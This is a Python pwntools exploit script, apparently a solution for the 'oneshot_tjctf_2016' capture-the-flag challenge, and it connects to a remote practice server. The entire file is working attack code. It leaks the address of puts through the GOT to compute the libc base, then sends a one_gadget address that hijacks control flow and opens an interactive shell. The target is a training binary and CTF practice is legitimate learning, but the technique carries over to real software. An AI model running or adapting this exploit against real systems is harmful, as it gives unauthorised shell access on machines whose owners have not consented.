# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'oneshot_tjctf_2016'
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)
islocal = 0
if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 27892)

def pwn():
    puts_got = elf.got['puts']
    log.success('puts_got => ' + str(puts_got))
    p.sendlineafter('location?', str(puts_got))
    p.recvuntil("0x")
    puts_addr = int(p.recvuntil("\n")[:16], 16)
    # libc_base = puts_addr - 0x6f6a0
    libc_base = puts_addr - 0x6f690
    one_gadget = libc_base + 0x45216
    log.success('puts_addr => ' + hex(puts_addr))
    log.success('libc_base => ' + hex(libc_base))
    log.success('one_gadget => ' + hex(one_gadget))

    p.sendline(str(one_gadget))

    p.interactive()

if __name__ == '__main__':
    pwn()